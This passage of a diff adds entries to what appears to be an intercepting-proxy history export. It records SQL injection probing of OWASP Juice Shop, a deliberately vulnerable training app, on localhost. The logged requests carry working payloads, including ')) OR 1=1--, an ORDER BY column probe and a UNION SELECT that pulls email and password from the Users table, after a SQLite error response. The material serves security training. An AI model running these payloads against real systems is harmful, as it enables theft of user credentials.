#abc7ff;--mdc-filled-text-field-container-color:#0000;--mdc-filled-text-field-disabled-container-color:#0000;--theme-background:#3e3e3e;--theme-background-lighter:#4a4a4a;--theme-background-light:#5a5a5a;--theme-background-darker:#333638;--theme-background-dark:#303030;--theme-background-darkest:#2b2b2b;--theme-text:#e8ecef;--theme-text-lighter:#f2f5f7;--theme-text-light:#fff;--theme-text-darker:#b8c0c7;--theme-text-dark:#7f8a93;--mat-sys-surface:#333638;--mat-sys-on-surface:#e8ecef;--mat-sys-surface-container:#3e3e3e;--mat-sys-surface-container-high:#404244;--mat-sys-on-surface-variant:#b8c0c7;--mat-sys-outline:#5a5a5a;--mat-sys-outline-variant:#404244}.bluegrey-lightgreen-theme{--theme-warn:#f44336;--theme-warn-lighter:rgb(245.5877358491, 94.1358490566, 83.0122641509);--theme-warn-light:rgb(246.6462264151, 112.2264150943, 102.3537735849);--theme-warn-darker:rgb(242.4122641509, 39.8641509434, 24.9877358491);--theme-warn-dark:rgb(234.1839622642, 27.9622641509, 12.8160377358);--theme-warn-fade-10:#f44336;--theme-warn-fade-20:#f44336;--theme-warn-fade-30:#f44336;--theme-warn-fade-40:#f44336;--theme-warn-fade-50:#f44336;--mat-sys-error:#f44336;--mat-sys-on-error:#fff}@media screen and (-webkit-min-device-pixel-ratio:0){}</style><link rel="stylesheet" href="styles.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.css"></noscript></head>
-<body class="bluegrey-lightgreen-theme">
-  <app-root></app-root>
-<link rel="modulepreload" href="chunk-KD3CNUZG.js"><link rel="modulepreload" href="chunk-PX7UKXVL.js"><link rel="modulepreload" href="chunk-Y3BEW76R.js"><link rel="modulepreload" href="chunk-R7LX7FKI.js"><link rel="modulepreload" href="chunk-7U6P4YGV.js"><link rel="modulepreload" href="chunk-UNFVUBM2.js"><link rel="modulepreload" href="chunk-KI34UYIE.js"><link rel="modulepreload" href="chunk-B3RFAYKZ.js"><link rel="modulepreload" href="chunk-EMJTEAHL.js"><link rel="modulepreload" href="chunk-6RWMKLEX.js"><script src="polyfills.js" type="module"></script><script src="scripts.js" defer></script><script src="main.js" type="module"></script></body>
-</html>
-]]></response>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIEludGVybmFsIFNlcnZlciBFcnJvcg0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOA0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpEYXRlOiBUaHUsIDAzIFNlcCAyMDI2IDE4OjAxOjMxIEdNVA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KS2VlcC1BbGl2ZTogdGltZW91dD01DQpDb250ZW50LUxlbmd0aDogOTk0DQoNCjxodG1sPgogIDxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0ndXRmLTgnPiAKICAgIDx0aXRsZT5FcnJvcjogU1FMSVRFX0VSUk9SOiBuZWFyICZxdW90OyYjMzk7JSYjMzk7JnF1b3Q7OiBzeW50YXggZXJyb3I8L3RpdGxlPgogICAgPHN0eWxlPiogewogIG1hcmdpbjogMDsKICBwYWRkaW5nOiAwOwogIG91dGxpbmU6IDA7Cn0KCmJvZHkgewogIHBhZGRpbmc6IDgwcHggMTAwcHg7CiAgZm9udDogMTNweCAiSGVsdmV0aWNhIE5ldWUiLCAiTHVjaWRhIEdyYW5kZSIsICJBcmlhbCI7CiAgYmFja2dyb3VuZDogI0VDRTlFOSAtd2Via2l0LWdyYWRpZW50KGxpbmVhciwgMCUgMCUsIDAlIDEwMCUsIGZyb20oI2ZmZiksIHRvKCNFQ0U5RTkpKTsKICBiYWNrZ3JvdW5kOiAjRUNFOUU5IC1tb3otbGluZWFyLWdyYWRpZW50KHRvcCwgI2ZmZiwgI0VDRTlFOSk7CiAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKICBjb2xvcjogIzU1NTsKICAtd2Via2l0LWZvbnQtc21vb3RoaW5nOiBhbnRpYWxpYXNlZDsKfQpoMSwgaDIgewogIGZvbnQtc2l6ZTogMjJweDsKICBjb2xvcjogIzM0MzQzNDsKfQpoMSBlbSwgaDIgZW0gewogIHBhZGRpbmc6IDAgNXB4OwogIGZvbnQtd2VpZ2h0OiBub3JtYWw7Cn0KaDEgewogIGZvbnQtc2l6ZTogNjBweDsKfQpoMiB7CiAgbWFyZ2luLXRvcDogMTBweDsKfQp1bCBsaSB7CiAgbGlzdC1zdHlsZTogbm9uZTsKfQojc3RhY2t0cmFjZSB7CiAgbWFyZ2luLWxlZnQ6IDYwcHg7Cn0KPC9zdHlsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8ZGl2IGlkPSJ3cmFwcGVyIj4KICAgICAgPGgxPk9XQVNQIEp1aWNlIFNob3AgKEV4cHJlc3MgXjQuMjIuMSk8L2gxPgogICAgICA8aDI+PGVtPjUwMDwvZW0+IEVycm9yOiBTUUxJVEVfRVJST1I6IG5lYXIgJnF1b3Q7JiMzOTslJiMzOTsmcXVvdDs6IHN5bnRheCBlcnJvcjwvaDI+CiAgICAgIDx1bCBpZD0ic3RhY2t0cmFjZSI+PC91bD4KICAgIDwvZGl2PgogIDwvYm9keT4KPC9odG1sPgo=]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:31:38 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=apple%27))%20OR%201=1--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=apple%27))%20OR%201=1--]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPWFwcGxlJTI3KSklMjBPUiUyMDE9MS0tIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1MC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVVzZXI6ID8xDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjU0NGQtRGpaeEl3a3ArcnM4Zk40WUJQeS9uVnRWWlg4Ig0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyI1NDRkLURqWnhJd2twK3JzOGZONFlCUHkvblZ0VlpYOCINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDE6MzggR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:31:45 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=apple%27))%20ORDER%20BY%209--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=apple%27))%20ORDER%20BY%209--]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPWFwcGxlJTI3KSklMjBPUkRFUiUyMEJZJTIwOS0tIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1MC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVVzZXI6ID8xDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjFlLUprUGNJK3BHajdCQlR4T3VaVFZWSW05MXphWSINCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
+    <status>304</status>
+    <responselength>304</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxZS1Ka1BjSStwR2o3QkJUeE91WlRWVkltOTF6YVkiDQpEYXRlOiBUaHUsIDAzIFNlcCAyMDI2IDE4OjAxOjQ1IEdNVA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KS2VlcC1BbGl2ZTogdGltZW91dD01DQoNCg==]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:31:52 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=apple%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=apple%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPWFwcGxlJTI3KSklMjBVTklPTiUyMFNFTEVDVCUyMGlkLGVtYWlsLHBhc3N3b3JkLDQsNSw2LDcsOCw5JTIwRlJPTSUyMFVzZXJzLS0gSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWE6ICJOb3Q7QT1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTUwIg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KSWYtTm9uZS1NYXRjaDogVy8iMTAyZi1qYmthaTcxclpIUE5qdkVtYldldXhpdkQvOUUiDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxMDJmLWpia2FpNzFyWkhQTmp2RW1iV2V1eGl2RC85RSINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDE6NTIgR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:31:16 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=testuser]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=testuser]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPXRlc3R1c2VyIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1MC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVVzZXI6ID8xDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjFlLUprUGNJK3BHajdCQlR4T3VaVFZWSW05MXphWSINCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
+    <status>304</status>
+    <responselength>304</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxZS1Ka1BjSStwR2o3QkJUeE91WlRWVkltOTF6YVkiDQpEYXRlOiBUaHUsIDAzIFNlcCAyMDI2IDE4OjAxOjE2IEdNVA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KS2VlcC1BbGl2ZTogdGltZW91dD01DQoNCg==]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:17 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/socket.io/?EIO=4&transport=polling&t=Q1eRRs7]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/socket.io/?EIO=4&transport=polling&t=Q1eRRs7]]></path>
+    <extension>io/</extension>
+    <request base64="true"><![CDATA[R0VUIC9zb2NrZXQuaW8vP0VJTz00JnRyYW5zcG9ydD1wb2xsaW5nJnQ9UTFlUlJzNyBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjkwMDANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpBY2NlcHQ6ICovKg0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTAuMC4wLjAgU2FmYXJpLzUzNy4zNg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLU1vZGU6IGNvcnMNClNlYy1GZXRjaC1EZXN0OiBlbXB0eQ0KUmVmZXJlcjogaHR0cDovL2xvY2FsaG9zdDo5MDAwLw0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>200</status>
+    <responselength>326</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW46IGh0dHA6Ly9sb2NhbGhvc3Q6NDIwMA0KVmFyeTogT3JpZ2luDQpDb250ZW50LVR5cGU6IHRleHQvcGxhaW47IGNoYXJzZXQ9VVRGLTgNCkNvbnRlbnQtTGVuZ3RoOiA5Ng0KRGF0ZTogVGh1LCAwMyBTZXAgMjAyNiAxODowMDoxNyBHTVQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCktlZXAtQWxpdmU6IHRpbWVvdXQ9NQ0KDQoweyJzaWQiOiIxdF9mM1EtRFFtV0ZYUEFJQUFCWSIsInVwZ3JhZGVzIjpbIndlYnNvY2tldCJdLCJwaW5nSW50ZXJ2YWwiOjI1MDAwLCJwaW5nVGltZW91dCI6NTAwMH0=]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/socket.io/?EIO=4&transport=polling&t=Q1eRRxw&sid=1t_f3Q-DQmWFXPAIAABY]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/socket.io/?EIO=4&transport=polling&t=Q1eRRxw&sid=1t_f3Q-DQmWFXPAIAABY]]></path>
+    <extension>io/</extension>
+    <request base64="true"><![CDATA[UE9TVCAvc29ja2V0LmlvLz9FSU89NCZ0cmFuc3BvcnQ9cG9sbGluZyZ0PVExZVJSeHcmc2lkPTF0X2YzUS1EUW1XRlhQQUlBQUJZIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0KQ29udGVudC1MZW5ndGg6IDINCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpBY2NlcHQ6ICovKg0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINCkNvbnRlbnQtdHlwZTogdGV4dC9wbGFpbjtjaGFyc2V0PVVURi04DQpzZWMtY2gtdWEtbW9iaWxlOiA/MA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1MC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpPcmlnaW46IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMA0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogY29ycw0KU2VjLUZldGNoLURlc3Q6IGVtcHR5DQpSZWZlcmVyOiBodHRwOi8vbG9jYWxob3N0OjkwMDAvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IHdlbGNvbWViYW5uZXJfc3RhdHVzPWRpc21pc3M7IGNvb2tpZWNvbnNlbnRfc3RhdHVzPWRpc21pc3M7IGNvbnRpbnVlQ29kZT02N2d3ckpXWjdsZVJFb0R5TmI0MU9WcFE4R212U2pqaG56MHZ6WEszeGpxNjVNa0xCbmE5Mm1ZUGdqcjk7IGxhbmd1YWdlPWVuDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCjQw]]></request>
+    <status>200</status>
+    <responselength>215</responselength>
+    <mimetype>text</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW46IGh0dHA6Ly9sb2NhbGhvc3Q6NDIwMA0KVmFyeTogT3JpZ2luDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MTggR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0Kb2s=]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/socket.io/?EIO=4&transport=polling&t=Q1eRRy0&sid=1t_f3Q-DQmWFXPAIAABY]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/socket.io/?EIO=4&transport=polling&t=Q1eRRy0&sid=1t_f3Q-DQmWFXPAIAABY]]></path>
+    <extension>io/</extension>
+    <request base64="true"><![CDATA[R0VUIC9zb2NrZXQuaW8vP0VJTz00JnRyYW5zcG9ydD1wb2xsaW5nJnQ9UTFlUlJ5MCZzaWQ9MXRfZjNRLURRbVdGWFBBSUFBQlkgSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KQWNjZXB0OiAqLyoNCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBjb3JzDQpTZWMtRmV0Y2gtRGVzdDogZW1wdHkNClJlZmVyZXI6IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC8NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
+    <status>200</status>
+    <responselength>262</responselength>
+    <mimetype>JSON</mimetype>
